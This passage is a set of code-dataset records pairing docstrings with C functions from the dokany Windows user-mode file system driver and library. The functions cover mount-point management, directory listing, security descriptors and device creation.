nextStringOffset;\n    point->SymbolicLinkNameLength = MountPoint->Length;\n    nextStringOffset =\n        point->SymbolicLinkNameOffset + point->SymbolicLinkNameLength;\n    RtlCopyMemory((PCHAR)point + point->SymbolicLinkNameOffset,\n                  MountPoint->Buffer, MountPoint->Length);\n  }\n  if (DeviceName != NULL) {\n    DDbgPrint(\"  DeviceName: %wZ\\n\", DeviceName);\n    point->DeviceNameOffset = nextStringOffset;\n    point->DeviceNameLength = DeviceName->Length;\n    RtlCopyMemory((PCHAR)point + point->DeviceNameOffset, DeviceName->Buffer,\n                  DeviceName->Length);\n  }\n\n  status = DokanSendIoContlToMountManager(IOCTL_MOUNTMGR_DELETE_POINTS, point,\n                                          length, deletedPoints, olength);\n\n  if (NT_SUCCESS(status)) {\n    DDbgPrint(\"  IoCallDriver success, %d mount points deleted.\\n\",\n              deletedPoints->NumberOfMountPoints);\n  } else {\n    DDbgPrint(\"  IoCallDriver failed: 0x%x %ls\\n\", status,\n              DokanGetNTSTATUSStr(status));\n  }\n\n  ExFreePool(point);\n  ExFreePool(deletedPoints);\n\n  DDbgPrint(\"<= DokanSendVolumeDeletePoints\\n\");\n\n  return status;\n}", "path": "dokany/sys/util/mountmgr.c", "commit_date": "2020-06-01 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "/* xattr operations are optional and can safely be left unimplemented */\n", "func_signal": "static int xmp_setxattr(const char *path, const char *name, const char *value,\n\t\t\tsize_t size, int flags)", "code": "{\n\tint res = lsetxattr(path, name, value, size, flags);\n\tif (res == -1)\n\t\treturn -errno;\n\treturn 0;\n}", "path": "dokany/samples/fuse_mirror/fusexmp.c", "commit_date": "2016-02-22 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Creates a buffer from DokanAlloc() containing\n// the parent dir of file/dir pointed to by fileName.\n// the buffer IS null terminated\n// in *parentDirLength returns length in bytes of string (not counting null\n// terminator)\n// fileName MUST be null terminated\n// if last char of fileName is \\, then it is ignored but a slash\n// is appened to the returned path\n//\n//  e.g. \\foo\\bar.txt becomes \\foo\n//       \\foo\\bar\\ bcomes \\foo\\\n//\n// if there is no parent, then it return STATUS_ACCESS_DENIED\n// if DokanAlloc() fails, then it returns STATUS_INSUFFICIENT_RESOURCES\n// otherwise returns STATUS_SUCCESS\n", "func_signal": "NTSTATUS DokanGetParentDir(__in const WCHAR *fileName, __out WCHAR **parentDir,\n                           __out ULONG *parentDirLength)", "code": "{\n  // first check if there is a parent\n\n  LONG len = (LONG)wcslen(fileName);\n\n  LONG i;\n\n  BOOLEAN trailingSlash;\n\n  *parentDir = NULL;\n  *parentDirLength = 0;\n\n  if (len < 1) {\n    return STATUS_INVALID_PARAMETER;\n  }\n\n  if (!wcscmp(fileName, L\"\\\\\"))\n    return STATUS_ACCESS_DENIED;\n\n  trailingSlash = fileName[len - 1] == '\\\\';\n\n  *parentDir = (WCHAR *)DokanAllocZero((len + 1) * sizeof(WCHAR));\n\n  if (!*parentDir)\n    return STATUS_INSUFFICIENT_RESOURCES;\n\n  RtlStringCchCopyW(*parentDir, len, fileName);\n\n  for (i = len - 1; i >= 0; i--) {\n    if ((*parentDir)[i] == '\\\\') {\n      if (i == len - 1 && trailingSlash) {\n        continue;\n      }\n      (*parentDir)[i] = 0;\n      break;\n    }\n  }\n\n  if (i <= 0) {\n    i = 1;\n    (*parentDir)[0] = '\\\\';\n    (*parentDir)[1] = 0;\n  }\n\n  *parentDirLength = i * sizeof(WCHAR);\n  if (trailingSlash && i > 1) {\n    (*parentDir)[i] = '\\\\';\n    (*parentDir)[i + 1] = 0;\n    *parentDirLength += sizeof(WCHAR);\n  }\n\n  return STATUS_SUCCESS;\n}", "path": "dokany/sys/create.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "/*\n * DefaultGetFileSecurity build a sddl of the current process user\n * with authenticate user rights for context menu. (New Folder, ...)\n * TODO - Only calculate the user's group sid once\n */\n", "func_signal": "NTSTATUS DefaultGetFileSecurity(LPCWSTR FileName,\n                                PSECURITY_INFORMATION SecurityInformation,\n                                PSECURITY_DESCRIPTOR SecurityDescriptor,\n                                ULONG BufferLength, PULONG LengthNeeded,\n                                PDOKAN_FILE_INFO DokanFileInfo)", "code": "{\n  WCHAR buffer[1024];\n  WCHAR finalBuffer[2048];\n  PTOKEN_USER userToken = NULL;\n  PTOKEN_GROUPS groupsToken = NULL;\n  HANDLE tokenHandle;\n  LPTSTR userSidString = NULL, groupSidString = NULL;\n\n  UNREFERENCED_PARAMETER(FileName);\n\n  if (OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &tokenHandle) ==\n      FALSE) {\n    DbgPrint(\"  OpenProcessToken failed: %d\\n\", GetLastError());\n    return STATUS_NOT_IMPLEMENTED;\n  }\n\n  DWORD returnLength;\n  if (!GetTokenInformation(tokenHandle, TokenUser, buffer, sizeof(buffer),\n                           &returnLength)) {\n    DbgPrint(\"  GetTokenInformation failed: %d\\n\", GetLastError());\n    CloseHandle(tokenHandle);\n    return STATUS_NOT_IMPLEMENTED;\n  }\n\n  userToken = (PTOKEN_USER)buffer;\n  if (!ConvertSidToStringSid(userToken->User.Sid, &userSidString)) {\n    DbgPrint(\"  ConvertSidToStringSid failed: %d\\n\", GetLastError());\n    CloseHandle(tokenHandle);\n    return STATUS_NOT_IMPLEMENTED;\n  }\n\n  if (!GetTokenInformation(tokenHandle, TokenGroups, buffer, sizeof(buffer),\n                           &returnLength)) {\n    DbgPrint(\"  GetTokenInformation failed: %d\\n\", GetLastError());\n    CloseHandle(tokenHandle);\n    return STATUS_NOT_IMPLEMENTED;\n  }\n\n  groupsToken = (PTOKEN_GROUPS)buffer;\n  if (groupsToken->GroupCount > 0) {\n    if (!ConvertSidToStringSid(groupsToken->Groups[0].Sid, &groupSidString)) {\n      DbgPrint(\"  ConvertSidToStringSid failed: %d\\n\", GetLastError());\n      CloseHandle(tokenHandle);\n      return STATUS_NOT_IMPLEMENTED;\n    }\n    swprintf_s(buffer, 1024, L\"O:%lsG:%ls\", userSidString, groupSidString);\n  } else\n    swprintf_s(buffer, 1024, L\"O:%ls\", userSidString);\n\n  LocalFree(userSidString);\n  LocalFree(groupSidString);\n  CloseHandle(tokenHandle);\n\n  // Authenticated users rights\n  if (DokanFileInfo->IsDirectory) {\n    swprintf_s(finalBuffer, 2048, L\"%lsD:PAI(A;OICI;FA;;;AU)\", buffer);\n  } else {\n    swprintf_s(finalBuffer, 2048, L\"%lsD:AI(A;ID;FA;;;AU)\", buffer);\n  }\n\n  PSECURITY_DESCRIPTOR SecurityDescriptorTmp = NULL;\n  ULONG Size = 0;\n  if (!ConvertStringSecurityDescriptorToSecurityDescriptor(\n          finalBuffer, SDDL_REVISION_1, &SecurityDescriptorTmp, &Size)) {\n    return STATUS_NOT_IMPLEMENTED;\n  }\n\n  LPTSTR pStringBuffer = NULL;\n  if (!ConvertSecurityDescriptorToStringSecurityDescriptor(\n          SecurityDescriptorTmp, SDDL_REVISION_1, *SecurityInformation,\n          &pStringBuffer, NULL)) {\n    return STATUS_NOT_IMPLEMENTED;\n  }\n\n  LocalFree(SecurityDescriptorTmp);\n  SecurityDescriptorTmp = NULL;\n  Size = 0;\n  if (!ConvertStringSecurityDescriptorToSecurityDescriptor(\n          pStringBuffer, SDDL_REVISION_1, &SecurityDescriptorTmp, &Size)) {\n    return STATUS_NOT_IMPLEMENTED;\n  }\n\n  if (Size > BufferLength) {\n    *LengthNeeded = Size;\n    return STATUS_BUFFER_OVERFLOW;\n  }\n\n  memcpy(SecurityDescriptor, SecurityDescriptorTmp, Size);\n  *LengthNeeded = Size;\n\n  LocalFree(pStringBuffer);\n  LocalFree(SecurityDescriptorTmp);\n\n  return STATUS_SUCCESS;\n}", "path": "dokany/dokan/security.c", "commit_date": "2020-10-14 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Uncomment the function and set dokanOperations.GetDiskFreeSpace to personalize disk space\n/*\nstatic NTSTATUS DOKAN_CALLBACK MirrorDokanGetDiskFreeSpace(\n    PULONGLONG FreeBytesAvailable, PULONGLONG TotalNumberOfBytes,\n    PULONGLONG TotalNumberOfFreeBytes, PDOKAN_FILE_INFO DokanFileInfo) {\n  UNREFERENCED_PARAMETER(DokanFileInfo);\n\n  *FreeBytesAvailable = (ULONGLONG)(512 * 1024 * 1024);\n  *TotalNumberOfBytes = 9223372036854775807;\n  *TotalNumberOfFreeBytes = 9223372036854775807;\n\n  return STATUS_SUCCESS;\n}\n*/\n", "func_signal": "static NTSTATUS DOKAN_CALLBACK MirrorDokanGetDiskFreeSpace(\n    PULONGLONG FreeBytesAvailable, PULONGLONG TotalNumberOfBytes,\n    PULONGLONG TotalNumberOfFreeBytes, PDOKAN_FILE_INFO DokanFileInfo)", "code": "{\n  UNREFERENCED_PARAMETER(DokanFileInfo);\n\n  DWORD SectorsPerCluster;\n  DWORD BytesPerSector;\n  DWORD NumberOfFreeClusters;\n  DWORD TotalNumberOfClusters;\n  WCHAR DriveLetter[3] = {'C', ':', 0};\n  PWCHAR RootPathName;\n\n  if (RootDirectory[0] == L'\\\\') { // UNC as Root\n    RootPathName = RootDirectory;\n  } else {\n    DriveLetter[0] = RootDirectory[0];\n    RootPathName = DriveLetter;\n  }\n\n  GetDiskFreeSpace(RootPathName, &SectorsPerCluster, &BytesPerSector,\n                   &NumberOfFreeClusters, &TotalNumberOfClusters);\n  *FreeBytesAvailable =\n      ((ULONGLONG)SectorsPerCluster) * BytesPerSector * NumberOfFreeClusters;\n  *TotalNumberOfFreeBytes =\n      ((ULONGLONG)SectorsPerCluster) * BytesPerSector * NumberOfFreeClusters;\n  *TotalNumberOfBytes =\n      ((ULONGLONG)SectorsPerCluster) * BytesPerSector * TotalNumberOfClusters;\n  return STATUS_SUCCESS;\n}", "path": "dokany/samples/dokan_mirror/mirror.c", "commit_date": "2020-10-09 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "/*\n * When the mount point is a reparse point (not a drive letter) on <= Win10\n * 1803, file names in FILE_OBJECTs initially have an 'unparsed' portion that is\n * all uppercase. This function changes them to the right case by getting it\n * from an undocumented extra create parameter. See:\n * https://community.osr.com/discussion/287522\n */\n", "func_signal": "void FixFileNameForReparseMountPoint(__in const UNICODE_STRING *MountPoint,\n                                     __in PIRP Irp)", "code": "{\n\n  if (!g_FixFileNameForReparseMountPoint) {\n    return;\n  }\n\n  // Only Revert when reparse point is used\n  if (IsMountPointDriveLetter(MountPoint)) {\n    return;\n  }\n\n  PECP_LIST ecpList;\n  struct SYMLINK_ECP_CONTEXT *ecpContext;\n  // IopSymlinkECPGuid \"73d5118a-88ba-439f-92f4-46d38952d250\";\n  static const GUID iopSymlinkECPGuid = {\n      0x73d5118a,\n      0x88ba,\n      0x439f,\n      {0x92, 0xf4, 0x46, 0xd3, 0x89, 0x52, 0xd2, 0x50}};\n\n  if (!NT_SUCCESS(FsRtlGetEcpListFromIrp(Irp, &ecpList)) || !ecpList) {\n    return;\n  }\n  if (!NT_SUCCESS(FsRtlFindExtraCreateParameter(ecpList, &iopSymlinkECPGuid,\n                                                (void **)&ecpContext, 0))) {\n    return;\n  }\n  if (FsRtlIsEcpFromUserMode(ecpContext) ||\n      !ecpContext->FlagsMountPoint.MountPoint.MountPoint) {\n    return;\n  }\n  USHORT unparsedNameLength = ecpContext->UnparsedNameLength;\n  if (unparsedNameLength == 0) {\n    return;\n  }\n\n  PUNICODE_STRING FileName =\n      &IoGetCurrentIrpStackLocation(Irp)->FileObject->FileName;\n  USHORT fileNameLength = FileName->Length;\n  USHORT ecpNameLength = ecpContext->Name.Length;\n  if (unparsedNameLength > ecpNameLength ||\n      unparsedNameLength > fileNameLength) {\n    return;\n  }\n\n  PWSTR unparsedNameInFileObject = (PWSTR)RtlOffsetToPointer(\n      FileName->Buffer, fileNameLength - unparsedNameLength);\n  UNICODE_STRING unparsedNameInFileObjectUS =\n      DokanWrapUnicodeString(unparsedNameInFileObject, unparsedNameLength);\n\n  PWSTR unparsedNameInEcp = (PWSTR)RtlOffsetToPointer(\n      ecpContext->Name.Buffer, ecpNameLength - unparsedNameLength);\n  UNICODE_STRING unparsedNameInEcpUS =\n      DokanWrapUnicodeString(unparsedNameInEcp, unparsedNameLength);\n\n  if (RtlEqualUnicodeString(&unparsedNameInFileObjectUS, &unparsedNameInEcpUS,\n                            /*CaseInSensitive=*/TRUE)) {\n    RtlCopyMemory(unparsedNameInFileObject, unparsedNameInEcp,\n                  unparsedNameLength);\n  }\n}", "path": "dokany/sys/create.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Returns TRUE if |dcb| type matches |DCB| and FALSE otherwise.\n", "func_signal": "BOOLEAN MatchDokanDCBType(__in PDokanDCB Dcb,\n                          __in PDOKAN_LOGGER Logger,\n                          __in BOOLEAN LogFailures)", "code": "{\n  if (!Dcb) {\n    if (LogFailures) {\n      DokanLogInfo(Logger, L\"There is no DCB.\");\n    }\n    return FALSE;\n  }\n  PrintIdType(Dcb);\n  if (GetIdentifierType(Dcb) != DCB) {\n    if (LogFailures) {\n      DokanLogInfo(Logger, L\"The DCB type is actually %x; expected %x.\",\n                   GetIdentifierType(Dcb), DCB);\n    }\n    return FALSE;\n  }\n  return TRUE;\n}", "path": "dokany/sys/fscontrol.c", "commit_date": "2020-10-09 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// add entry which matches the pattern specified in EventContext\n// to the buffer specified in EventInfo\n//\n", "func_signal": "LONG MatchFiles(PEVENT_CONTEXT EventContext, PEVENT_INFORMATION EventInfo,\n                PLIST_ENTRY FindDataList, BOOLEAN PatternCheck,\n                PDOKAN_INSTANCE DokanInstance)", "code": "{\n  PLIST_ENTRY thisEntry, listHead, nextEntry;\n\n  ULONG lengthRemaining = EventInfo->BufferLength;\n  PVOID currentBuffer = EventInfo->Buffer;\n  PVOID lastBuffer = currentBuffer;\n  ULONG index = 0;\n  BOOL caseSensitive = FALSE;\n  PWCHAR pattern = NULL;\n\n  // search patten is specified\n  if (PatternCheck &&\n      EventContext->Operation.Directory.SearchPatternLength != 0) {\n    pattern = (PWCHAR)(\n        (SIZE_T)&EventContext->Operation.Directory.SearchPatternBase[0] +\n        (SIZE_T)EventContext->Operation.Directory.SearchPatternOffset);\n  }\n\n  caseSensitive =\n      DokanInstance->DokanOptions->Options & DOKAN_OPTION_CASE_SENSITIVE;\n\n  listHead = FindDataList;\n\n  for (thisEntry = listHead->Flink; thisEntry != listHead;\n       thisEntry = nextEntry) {\n\n    PDOKAN_FIND_DATA find;\n    nextEntry = thisEntry->Flink;\n\n    find = CONTAINING_RECORD(thisEntry, DOKAN_FIND_DATA, ListEntry);\n\n    DbgPrintW(L\"FileMatch? : %s (%s,%d,%d)\\n\", find->FindData.cFileName,\n              (pattern ? pattern : L\"null\"),\n              EventContext->Operation.Directory.FileIndex, index);\n\n    // pattern is not specified or pattern match is ignore cases\n    if (!pattern || DokanIsNameInExpression(pattern, find->FindData.cFileName,\n                                            !caseSensitive)) {\n\n      if (EventContext->Operation.Directory.FileIndex <= index) {\n        // index+1 is very important, should use next entry index\n        ULONG entrySize = DokanFillDirectoryInformation(\n            EventContext->Operation.Directory.FileInformationClass,\n            currentBuffer, &lengthRemaining, &find->FindData, index + 1,\n            DokanInstance);\n        // buffer is full\n        if (entrySize == 0)\n          break;\n\n        // pointer of the current last entry\n        lastBuffer = currentBuffer;\n\n        // end if needs to return single entry\n        if (EventContext->Flags & SL_RETURN_SINGLE_ENTRY) {\n          DbgPrint(\"  =>return single entry\\n\");\n          index++;\n          break;\n        }\n\n        DbgPrint(\"  =>return\\n\");\n\n        // the offset of next entry\n        ((PFILE_BOTH_DIR_INFORMATION)currentBuffer)->NextEntryOffset =\n            entrySize;\n\n        // next buffer position\n        currentBuffer = (PCHAR)currentBuffer + entrySize;\n      }\n      index++;\n    }\n  }\n\n  // Since next of the last entry doesn't exist, clear next offset\n  ((PFILE_BOTH_DIR_INFORMATION)lastBuffer)->NextEntryOffset = 0;\n\n  // acctualy used length of buffer\n  EventInfo->BufferLength =\n      EventContext->Operation.Directory.BufferLength - lengthRemaining;\n\n  if (index <= EventContext->Operation.Directory.FileIndex) {\n\n    if (thisEntry != listHead)\n      return -2; // BUFFER_OVERFLOW\n\n    return -1; // NO_MORE_FILES\n  }\n\n  return index;\n}", "path": "dokany/dokan/directory.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Called with the VCB locked. Immediately deletes the FCBs that are ready to\n// delete. Returns how many are skipped due to having been scheduled too\n// recently. If Force is TRUE then all the scheduled ones are deleted, and the\n// return value is 0.\n", "func_signal": "ULONG DeleteFcbGarbageAndGetRemainingCount(__in PDokanVCB Vcb,\n                                           __in BOOLEAN Force)", "code": "{\n  ULONG remainingCount = 0;\n  PLIST_ENTRY thisEntry = NULL;\n  PLIST_ENTRY nextEntry = NULL;\n  PDokanFCB nextFcb = NULL;\n  for (thisEntry = Vcb->FcbGarbageList.Flink; thisEntry != &Vcb->FcbGarbageList;\n       thisEntry = nextEntry) {\n    nextEntry = thisEntry->Flink;\n    nextFcb = CONTAINING_RECORD(thisEntry, DokanFCB, NextGarbageCollectableFcb);\n    // We want it to have been scheduled for at least one timer interval so\n    // that there is a guaranteed window of possible reuse, which achieves the\n    // performance gains we are aiming for with GC.\n    if (Force || nextFcb->GarbageCollectionGracePeriodPassed) {\n      RemoveEntryList(thisEntry);\n      DokanFCBLockRW(nextFcb);\n      DokanDeleteFcb(Vcb, nextFcb);\n    } else {\n      nextFcb->GarbageCollectionGracePeriodPassed = TRUE;\n      ++remainingCount;\n    }\n  }\n  ASSERT(!Force || remainingCount == 0);\n  // When an FCB gets deleted by a GC cycle already in progress at the time of\n  // its scheduling, there's no point in triggering a follow-up cycle for that\n  // one.\n  if (remainingCount == 0) {\n    KeClearEvent(&Vcb->FcbGarbageListNotEmpty);\n  }\n  return remainingCount;\n}", "path": "dokany/sys/util/fcb.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "//#define DOKAN_NET_PROVIDER\n", "func_signal": "NTSTATUS\nDokanCreateDiskDevice(__in PDRIVER_OBJECT DriverObject, __in ULONG MountId,\n                      __in PWCHAR MountPoint, __in PWCHAR UNCName,\n                      __in ULONG SessionId, __in PWCHAR BaseGuid,\n                      __in PDOKAN_GLOBAL DokanGlobal,\n                      __in DEVICE_TYPE DeviceType,\n                      __in ULONG DeviceCharacteristics,\n                      __in BOOLEAN MountGlobally, __in BOOLEAN UseMountManager,\n                      __out PDokanDCB *Dcb)", "code": "{\n  WCHAR *diskDeviceNameBuf = NULL;\n  WCHAR *symbolicLinkNameBuf = NULL;\n  WCHAR *mountPointBuf = NULL;\n  PDEVICE_OBJECT diskDeviceObject = NULL;\n  PDokanDCB dcb = NULL;\n  UNICODE_STRING diskDeviceName;\n  BOOLEAN isNetworkFileSystem = (DeviceType == FILE_DEVICE_NETWORK_FILE_SYSTEM);\n  PDOKAN_CONTROL dokanControl = NULL;\n  NTSTATUS status = STATUS_SUCCESS;\n  DOKAN_INIT_LOGGER(logger, DriverObject, 0);\n\n  __try {\n    DokanLogInfo(&logger,\n                 L\"Creating disk device; mount point = %s; mount ID = %ul\",\n                 MountPoint, MountId);\n    diskDeviceNameBuf = DokanAllocZero(MAXIMUM_FILENAME_LENGTH * sizeof(WCHAR));\n    symbolicLinkNameBuf =\n        DokanAllocZero(MAXIMUM_FILENAME_LENGTH * sizeof(WCHAR));\n    mountPointBuf = DokanAllocZero(MAXIMUM_FILENAME_LENGTH * sizeof(WCHAR));\n    dokanControl = DokanAllocZero(sizeof(DOKAN_CONTROL));\n    if (diskDeviceNameBuf == NULL || symbolicLinkNameBuf == NULL ||\n        mountPointBuf == NULL || dokanControl == NULL) {\n      status = DokanLogError(&logger, STATUS_INSUFFICIENT_RESOURCES,\n          L\"Could not allocate buffers while creating disk device.\");\n      __leave;\n    }\n\n    // make DeviceName and SymboliLink\n    if (isNetworkFileSystem) {\n#ifdef DOKAN_NET_PROVIDER\n      RtlStringCchCopyW(diskDeviceNameBuf, MAXIMUM_FILENAME_LENGTH,\n                        DOKAN_NET_DEVICE_NAME);\n      RtlStringCchCopyW(symbolicLinkNameBuf, MAXIMUM_FILENAME_LENGTH,\n                        DOKAN_NET_SYMBOLIC_LINK_NAME);\n#else\n      RtlStringCchCopyW(diskDeviceNameBuf, MAXIMUM_FILENAME_LENGTH,\n                        DOKAN_NET_DEVICE_NAME);\n      RtlStringCchCatW(diskDeviceNameBuf, MAXIMUM_FILENAME_LENGTH, BaseGuid);\n      RtlStringCchCopyW(symbolicLinkNameBuf, MAXIMUM_FILENAME_LENGTH,\n                        DOKAN_NET_SYMBOLIC_LINK_NAME);\n      RtlStringCchCatW(symbolicLinkNameBuf, MAXIMUM_FILENAME_LENGTH, BaseGuid);\n#endif\n\n    } else {\n      RtlStringCchCopyW(diskDeviceNameBuf, MAXIMUM_FILENAME_LENGTH,\n                        DOKAN_DISK_DEVICE_NAME);\n      RtlStringCchCatW(diskDeviceNameBuf, MAXIMUM_FILENAME_LENGTH, BaseGuid);\n      RtlStringCchCopyW(symbolicLinkNameBuf, MAXIMUM_FILENAME_LENGTH,\n                        DOKAN_SYMBOLIC_LINK_NAME);\n      RtlStringCchCatW(symbolicLinkNameBuf, MAXIMUM_FILENAME_LENGTH, BaseGuid);\n    }\n\n    RtlInitUnicodeString(&diskDeviceName, diskDeviceNameBuf);\n\n    //\n    // Create DeviceObject for the Disk Device\n    //\n    if (!isNetworkFileSystem) {\n      status =\n          IoCreateDeviceSecure(DriverObject,          // DriverObject\n                               sizeof(DokanDCB),      // DeviceExtensionSize\n                               &diskDeviceName,       // DeviceName\n                               FILE_DEVICE_DISK,      // DeviceType\n                               DeviceCharacteristics, // DeviceCharacteristics\n                               FALSE,                 // Not Exclusive\n                               &sddl,                 // Default SDDL String\n                               NULL,                  // Device Class GUID\n                               &diskDeviceObject);    // DeviceObject\n    } else {\n      status = IoCreateDevice(DriverObject,          // DriverObject\n                              sizeof(DokanDCB),      // DeviceExtensionSize\n                              NULL,                  // DeviceName\n                              FILE_DEVICE_DISK,      // DeviceType\n                              DeviceCharacteristics, // DeviceCharacteristics\n                              FALSE,                 // Not Exclusive\n                              &diskDeviceObject);    // DeviceObject\n    }\n\n    if (!NT_SUCCESS(status)) {\n      DokanLogError(&logger, status,\n          (isNetworkFileSystem\n              ? L\"IoCreateDevice(FILE_DEVICE_UNKNOWN) failed.\"\n              : L\"IoCreateDeviceSecure(FILE_DEVICE_DISK) failed.\"));\n      __leave;\n    }\n\n    //\n    // Initialize the device extension.\n    //\n    dcb = diskDeviceObject->DeviceExtension;\n    *Dcb = dcb;\n    dcb->DeviceObject = diskDeviceObject;\n    dcb->Global = DokanGlobal;\n\n    dcb->Identifier.Type = DCB;\n    dcb->Identifier.Size = sizeof(DokanDCB);\n\n    dcb->MountId = MountId;\n    dcb->VolumeDeviceType = DeviceType;\n    dcb->DeviceType = FILE_DEVICE_DISK;\n    dcb->DeviceCharacteristics = DeviceCharacteristics;\n    dcb->SessionId = SessionId;\n    KeInitializeEvent(&dcb->KillEvent, NotificationEvent, FALSE);\n    KeInitializeEvent(&dcb->ForceTimeoutEvent, NotificationEvent, FALSE);\n    IoInitializeRemoveLock(&dcb->RemoveLock, TAG, 1, 100);\n    //\n    // Establish user-buffer access method.\n    //\n    diskDeviceObject->Flags |= DO_DIRECT_IO;\n\n    // initialize Event and Event queue\n    DokanInitIrpList(&dcb->PendingIrp);\n    DokanInitIrpList(&dcb->PendingEvent);\n    DokanInitIrpList(&dcb->NotifyEvent);\n    DokanInitIrpList(&dcb->PendingRetryIrp);\n\n    KeInitializeEvent(&dcb->ReleaseEvent, NotificationEvent, FALSE);\n    ExInitializeResourceLite(&dcb->Resource);\n\n    dcb->CacheManagerNoOpCallbacks.AcquireForLazyWrite = &DokanNoOpAcquire;\n    dcb->CacheManagerNoOpCallbacks.ReleaseFromLazyWrite = &DokanNoOpRelease;\n    dcb->CacheManagerNoOpCallbacks.AcquireForReadAhead = &DokanNoOpAcquire;\n    dcb->CacheManagerNoOpCallbacks.ReleaseFromReadAhead = &DokanNoOpRelease;\n\n    dcb->MountGlobally = MountGlobally;\n    dcb->UseMountManager = UseMountManager;\n    if (wcscmp(MountPoint, L\"\") != 0) {\n      RtlStringCchCopyW(mountPointBuf, MAXIMUM_FILENAME_LENGTH,\n                        L\"\\\\DosDevices\\\\\");\n      if (wcslen(MountPoint) < 4) {\n        mountPointBuf[12] = towupper(MountPoint[0]);\n        mountPointBuf[13] = L':';\n        mountPointBuf[14] = L'\\0';\n      } else {\n        RtlStringCchCatW(mountPointBuf, MAXIMUM_FILENAME_LENGTH, MountPoint);\n      }\n      if (isNetworkFileSystem) {\n        dcb->UseMountManager = FALSE;\n      }\n    } else {\n      RtlStringCchCopyW(mountPointBuf, MAXIMUM_FILENAME_LENGTH, L\"\");\n    }\n\n    dcb->DiskDeviceName = DokanAllocateUnicodeString(diskDeviceNameBuf);\n    dcb->SymbolicLinkName = DokanAllocateUnicodeString(symbolicLinkNameBuf);\n    dcb->MountPoint = DokanAllocateUnicodeString(mountPointBuf);\n    if (UNCName != NULL) {\n      dcb->UNCName = DokanAllocateUnicodeString(UNCName);\n    }\n\n    if (dcb->DiskDeviceName == NULL || dcb->SymbolicLinkName == NULL ||\n        dcb->MountPoint == NULL || (dcb->UNCName == NULL && UNCName != NULL)) {\n      DDbgPrint(\"  Failed to allocate memory for device naming\");\n      FreeDcbNames(dcb);\n      ExDeleteResourceLite(&dcb->Resource);\n      IoDeleteDevice(diskDeviceObject);\n      status = STATUS_INSUFFICIENT_RESOURCES;\n      __leave;\n    }\n    DokanLogInfo(&logger,\n                 L\"disk device name: %wZ; symbolic link name: %wZ; \"\n                 L\"mount point: %wZ; type: %d\",\n                 dcb->DiskDeviceName, dcb->SymbolicLinkName, dcb->MountPoint,\n                 DeviceType);\n\n    //\n    // Create a symbolic link for userapp to interact with the driver.\n    //\n    status = IoCreateSymbolicLink(dcb->SymbolicLinkName, dcb->DiskDeviceName);\n\n    if (!NT_SUCCESS(status)) {\n      ExDeleteResourceLite(&dcb->Resource);\n      IoDeleteDevice(diskDeviceObject);\n      FreeDcbNames(dcb);\n      DokanLogError(&logger, status, L\"IoCreateSymbolicLink failed.\");\n      __leave;\n    }\n    DokanLogInfo(&logger, L\"SymbolicLink: %wZ -> %wZ created\",\n                 dcb->SymbolicLinkName,\n                 dcb->DiskDeviceName);\n\n    // Mark devices as initialized\n    diskDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;\n\n    ObReferenceObject(diskDeviceObject);\n\n    // Save to the global mounted list\n    RtlZeroMemory(dokanControl, sizeof(DOKAN_CONTROL));\n    RtlStringCchCopyW(dokanControl->DeviceName,\n                      sizeof(dokanControl->DeviceName) / sizeof(WCHAR),\n                      diskDeviceNameBuf);\n    RtlStringCchCopyW(dokanControl->MountPoint,\n                      sizeof(dokanControl->MountPoint) / sizeof(WCHAR),\n                      mountPointBuf);\n    if (UNCName != NULL) {\n      RtlStringCchCopyW(dokanControl->UNCName,\n                        sizeof(dokanControl->UNCName) / sizeof(WCHAR), UNCName);\n    }\n    dokanControl->Type = DeviceType;\n    dokanControl->SessionId = dcb->SessionId;\n\n    InsertMountEntry(DokanGlobal, dokanControl, FALSE);\n  } __finally {\n    if (diskDeviceNameBuf)\n      ExFreePool(diskDeviceNameBuf);\n    if (symbolicLinkNameBuf)\n      ExFreePool(symbolicLinkNameBuf);\n    if (mountPointBuf)\n      ExFreePool(mountPointBuf);\n    if (dokanControl)\n      ExFreePool(dokanControl);\n  }\n\n  return status;\n}", "path": "dokany/sys/init.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Moves the contents of the given Source list to Dest, discarding IRPs that\n// have been canceled while waiting in the list. The IRPs that end up in Dest\n// should then be acted on in some way that leads to their completion. The\n// Source list is still usable and is empty after this function returns.\n", "func_signal": "VOID MoveIrpList(__in PIRP_LIST Source, __out LIST_ENTRY* Dest)", "code": "{\n  PLIST_ENTRY listHead;\n  PIRP_ENTRY irpEntry;\n  KIRQL oldIrql;\n  PIRP irp;\n\n  InitializeListHead(Dest);\n\n  ASSERT(KeGetCurrentIrql() <= DISPATCH_LEVEL);\n  KeAcquireSpinLock(&Source->ListLock, &oldIrql);\n\n  while (!IsListEmpty(&Source->ListHead)) {\n    listHead = RemoveHeadList(&Source->ListHead);\n    irpEntry = CONTAINING_RECORD(listHead, IRP_ENTRY, ListEntry);\n    irp = irpEntry->Irp;\n    if (irp == NULL) {\n      // this IRP has already been canceled\n      ASSERT(irpEntry->CancelRoutineFreeMemory == FALSE);\n      DokanFreeIrpEntry(irpEntry);\n      continue;\n    }\n\n    if (IoSetCancelRoutine(irp, NULL) == NULL) {\n      // Cancel routine will run as soon as we release the lock\n      InitializeListHead(&irpEntry->ListEntry);\n      irpEntry->CancelRoutineFreeMemory = TRUE;\n      continue;\n    }\n    InsertTailList(Dest, &irpEntry->ListEntry);\n  